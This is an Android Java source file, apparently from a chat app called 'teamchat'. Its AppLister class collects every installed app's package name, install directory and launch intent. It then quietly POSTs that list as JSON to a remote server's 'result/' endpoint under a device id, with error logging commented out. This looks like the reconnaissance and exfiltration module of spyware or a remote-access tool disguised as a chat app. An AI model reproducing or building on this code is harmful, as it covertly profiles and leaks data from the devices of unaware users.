package com.example.teamchat;

import static com.example.teamchat.Constants.SERVER;

import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.util.List;

public class AppLister {
    private final static String TAG = ChatService.class.getSimpleName();
    public static void ListApps(PackageManager pm, String id) throws JSONException {
        //Log.d(TAG, "Getting installed packages");

        //get a list of installed apps.
        List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);

        JSONArray messagesArray = new JSONArray();
        for (ApplicationInfo packageInfo : packages) {
            JSONObject json = null;
            try {
                // Create a JSON object to send to the server
                json = new JSONObject();
                json.put("package", packageInfo.packageName);
                json.put("sourceDir", packageInfo.sourceDir);
                json.put("launchActivity", pm.getLaunchIntentForPackage(packageInfo.packageName));
                messagesArray.put(json);
            } catch (JSONException e) {
                //Log.e(TAG, "Error creating JSON object: " + e.getMessage());
            }
        }

        JSONObject parentObject = new JSONObject();
        parentObject.put("code", "app");
        parentObject.put("data", messagesArray);

        try {
            HttpConnection.ReturnResponse response = HttpConnection.connect(SERVER + "result/" + id, "POST", parentObject.toString());

            assert response != null;
            if (response.responseCode == 200) {
                Log.d(TAG, "Response: " + response.body);
            } else {
                throw new IOException("Unexpected code " + response.responseCode);
            }
        } catch (IOException e) {
            //Log.e(TAG, "Error sending request: " + e.getMessage());
        }
    }
}
